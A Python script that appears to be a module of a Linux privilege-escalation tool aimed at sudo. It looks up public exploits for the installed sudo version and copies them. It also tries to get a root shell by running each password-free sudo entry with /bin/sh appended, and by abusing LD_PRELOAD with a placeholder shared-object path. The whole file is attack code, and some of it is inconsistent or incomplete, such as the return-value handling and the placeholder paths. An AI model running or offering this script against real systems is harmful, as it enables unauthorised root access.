#!/usr/bin/env python3
import subprocess
import re

import utils

def get_sudo_version():
    """
    Gets the sudo version, returning the version in various formats.
    """
    command = 'sudo -V | grep "Sudo ver" '
    stdout = utils.execute_command(command)
    match = re.search(r'(\d+\.\d+(?:\.\d+)?[a-z]?(?:p\d+)?)', stdout)
    if match:
        return match.group(1)
    else:
        return "Version not found"

def get_sudo_ln_commands():
    """
    Returns a list of commands the current user can run with sudo without entering a password.
    """
    nopasswd_cmds = []
    exploit_ld = False
    try:
        stdout = utils.execute_command('sudo -ln')
        for line in stdout.splitlines():
            if 'LD_PRELOAD' in line:
                exploit_ld = True
            if 'NOPASSWD' in line:
                cmd = re.search(r'NOPASSWD: (.*)', line)
                if cmd:
                    nopasswd_cmds.append(cmd.group(1))
    except subprocess.CalledProcessError as e:
        print(f"Error checking sudo permissions: {e}")
    return nopasswd_cmds, exploit_ld

def exploit_nopasswd_command(cmd):
    """
    Attempts to exploit the NOPASSWD command to gain a root shell.
    """
    print(f"[+] Trying to exploit NOPASSWD command: {cmd}")
    try:
        # Example exploit - modify as needed based on the command
        if '*' in cmd or cmd.strip() == 'ALL':
            print("[-] Command seems too broad or unsafe to exploit directly.")
        else:
            # Attempt to spawn a root shell using the NOPASSWD command
            subprocess.run(f'sudo {cmd} /bin/sh', shell=True)
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

def can_use_ld_preload():
    """
    Checks if the current user can exploit LD_PRELOAD based on sudo permissions.
    """
    stdout, stderr = utils.execute_command('sudo -l')
    password_indicators = ["password for", "Password:", "password:"]
    # Check both stdout and stderr for any indicators
    for indicator in password_indicators:
        if indicator in stdout or indicator in stderr:
            print("[-] sudo -l requires a password. Terminating process.")
            return False
    return True

def exploit_ld_preload():
    """
    Attempts to exploit LD_PRELOAD to gain a root shell.
    """
    shared_object_path = "/path/to/shell.so"  # Adjust to your shell.so path
    command_to_run = "find"  # Example command, adjust based on actual allowed commands
    print("[+] Attempting to exploit LD_PRELOAD...")
    stdout, stderr = utils.execute_command(f'sudo LD_PRELOAD={shared_object_path} {command_to_run}')
    if stderr:
        print(f"[-] Exploit failed: {stderr}")
    else:
        print(stdout)

def main():
    list_of_vector = "SUDO"
    sudo_version = get_sudo_version()
    print(f"SUDO Version: {sudo_version}")

    print("\nSearching for exploits for the sudo version...")
    quary = "sudo " + sudo_version
    print(quary)
    exploits_output = utils.search_exploits(quary)

    exploit_ids = utils.extract_exploit_ids(exploits_output)
    if exploit_ids:
        print("Found potential exploit! IDs:", exploit_ids)
        # Copy all found exploits
        for exploit_id in exploit_ids:
            utils.copy_exploit(exploit_id, list_of_vector)
    else:
        print("No exploits found for the sudo version .")

    print("[*] Checking for sudo NOPASSWD commands...")
    sudo_ln = get_sudo_ln_commands()
    if sudo_ln[0]:
        print("[+] Found NOPASSWD commands: ")
        for cmd in sudo_ln[0]:
            print(f"    {cmd}")
            exploit_nopasswd_command(cmd)
    else:
        print("[-] No NOPASSWD commands found.")

    if sudo_ln[1]:
        exploit_ld_preload()
    else:
        print("[-] LD_PRELOAD exploit not viable or not allowed.")

if __name__ == "__main__":
    main()